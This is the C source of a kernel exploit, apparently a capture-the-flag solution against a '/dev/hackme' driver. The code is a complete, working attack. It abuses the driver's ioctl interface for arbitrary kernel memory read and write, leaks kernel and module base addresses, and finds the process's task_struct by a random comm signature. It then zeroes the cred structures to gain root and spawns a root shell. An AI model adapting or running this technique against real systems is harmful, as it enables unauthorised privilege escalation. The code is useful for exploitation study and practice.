/* 
 * author: luckasdf0
 * build: diet gcc ./solve.c -static -o exploit && gzip -kf exploit && base64 exploit.gz
 */

#define _GNU_SOURCE
#include <stdio.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <string.h>
#include <stdint.h>
#include <sys/prctl.h>

#include "utils.h"

#define LOG(...) printf(__VA_ARGS__)
#define x86_64

extern struct trap_frame_64 tf;
extern void (*commit_creds)(int);
extern int (*prepare_kernel_cred)(int);

int fd;
uint64_t *page1 = NULL;
uint64_t *page2 = NULL;

void _add(int idx, uint64_t *ptr, uint64_t size) {
    uint64_t cmd[4];
    memset(cmd, 0, sizeof(cmd));

    cmd[0] = idx;
    cmd[1] = (uint64_t)ptr;
    cmd[2] = size;
    cmd[3] = 0xdeadbeefdeadbeef;
    ioctl(fd, 0x30000, &cmd);
}

void _del(int idx) {
    uint64_t cmd[4];
    memset(cmd, 0, sizeof(cmd));

    cmd[0] = idx;
    cmd[1] = 0xdeadbeefdeadbeef;
    cmd[2] = 0xdeadbeefdeadbeef;
    cmd[3] = 0xdeadbeefdeadbeef;
    ioctl(fd, 0x30001, &cmd);
}

void _write(int idx, uint64_t offset, uint64_t *ptr, size_t size) {
    uint64_t cmd[4];
    memset(cmd, 0, sizeof(cmd));

    cmd[0] = idx;
    cmd[1] = (uint64_t)ptr;
    cmd[2] = size;
    cmd[3] = offset;
    ioctl(fd, 0x30002, &cmd);
}

void _read(int idx, uint64_t offset, uint64_t *ptr, size_t size) {
    uint64_t cmd[4];
    memset(cmd, 0, sizeof(cmd));

    cmd[0] = idx;
    cmd[1] = (uint64_t)ptr;
    cmd[2] = size;
    cmd[3] = offset;
    ioctl(fd, 0x30003, &cmd);
}

void read_mem(uint64_t addr, uint64_t size, uint64_t buffer) {
    uint64_t kern_addr = addr;
    _write((0x3080-0x2400)/0x10, 0, &kern_addr, 8);
    _read(0, 0, buffer, size);
}

void write_mem(uint64_t addr, uint64_t size, uint64_t buffer) {
    uint64_t kern_addr = addr;
    _write((0x3080-0x2400)/0x10, 0, &kern_addr, 8);
    _write(0, 0, buffer, size);
}


#define TASK_COMM_LEN 16
char comm[TASK_COMM_LEN];
uint64_t kernel_heap_base = 0xffff880000000000;

void find_task_struct(unsigned long *cred, unsigned long *real_cred) {
    unsigned long offset = 0;
    unsigned long k_addr = kernel_heap_base;
    unsigned long *start_buffer = NULL;
    uint64_t buffer = (uint64_t)malloc(0x1000);
    int ret;

    while(1) {
        memset(buffer, 0, 0x1000);
        k_addr = kernel_heap_base + offset;
        if(k_addr < kernel_heap_base) {
            break;
        }

        read_mem(k_addr, 0x1000, buffer);
        start_buffer = (unsigned long *)buffer;
        start_buffer = memmem(start_buffer, 0x1000, comm, sizeof(comm));

        if(start_buffer != NULL) {
            if ((start_buffer[-2] > kernel_heap_base) && (start_buffer[-1] > kernel_heap_base)) {
                *real_cred = start_buffer[-2];
                *cred = start_buffer[-1];

                printf("[+] Found comm signature %s at %p [+]\n", start_buffer, (unsigned long *) (k_addr + ((char *)start_buffer - buffer)));
                printf("[+] real_cred: %p [+]\n", *real_cred);
                printf("[+] cred: %p [+]\n", *cred);
                break;
            }
        }
        offset += 0x1000;
    }
}

int overwrite_creds(int fd, unsigned long cred_addr, unsigned long real_cred_addr) {
    void *ptr = malloc(0x38);
    memset(ptr, 0, 0x38);
    write_mem(cred_addr, 0x38, ptr);
    write_mem(real_cred_addr, 0x38, ptr);

    printf("...\n");
    if(getuid() != 0) {
        return -1;

    }
    return 0;
}
void gen_rand_str(char *str, unsigned int len) {
    unsigned int i;
    for ( i = 0; i < (len - 1); i++   )
        str[i] = (rand() % (0x7e - 0x20)) + 0x20;
    str[len - 1] = 0;
}


int main(int argc, char const* argv[]) {
    srand(time(NULL));
    gen_rand_str(comm, sizeof(comm));
    printf("Generated comm signature: '%s'\n", comm);
    int ret = prctl(PR_SET_NAME, comm);
    if (ret < 0) {
        die("prctl");
    }

    fd = open("/dev/hackme", O_RDONLY);
    if (fd < 0) {
        die("fd");
    }

    page1 = (uint64_t *)mmap(0xdeadbeefdead, 0x1000, PROT_WRITE|PROT_READ, MAP_ANONYMOUS|MAP_PRIVATE, 0, 0);
    page2 = (uint64_t *)mmap(0xcafebabecafe, 0x1000, PROT_WRITE|PROT_READ, MAP_ANONYMOUS|MAP_PRIVATE, 0, 0);
    if (page1 == -1 || page2 == -1) {
        die("mmap page");
    }

    memset(page1, '1', 0x1000);
    memset(page2, '2', 0x1000);

    _add(0, page1, 0x1000);
    _add(1, page1, 0x1000);
    _add(2, page1, 0x1000);

    uint64_t pool = 0xffffffffc0002400;

    _read((0x3050-0x2400)/0x10, 0, page2, 0x40);
    uint64_t ko_base = *(uint64_t *)page2-0x2180;
    _read((0x3080-0x2400)/0x10, 0, page2, 0x40);
    hexdump(page2, 0x40);
    uint64_t heap1 = *(uint64_t *)page2;

    kernel_heap_base = heap1-0x89000;

    LOG("ko: 0x%016lx\n", ko_base);
    LOG("heap1: 0x%016lx\n", heap1);
    LOG("kernel heap base : 0x%016lx\n", kernel_heap_base);

    read_mem(ko_base+0x2020, 8, page2);

    getchar();
    uint64_t kern_base = *(uint64_t *)page2-0x853c00;
    LOG("kernel base: 0x%016lx\n", kern_base);

    uint64_t cred, real_cred;
    find_task_struct(&cred, &real_cred);

    if(cred == 0 && real_cred == 0) {
        printf("[x] Could not find comm field exiting...\n");
        exit(-1);
    }

    if(overwrite_creds(fd, cred, real_cred) == 0) {
        printf("[!!!] Successfully escalated privileges, you get a root shell....\n");
        system("/bin/sh");
    }

    puts("bye!");

    return 0;
}
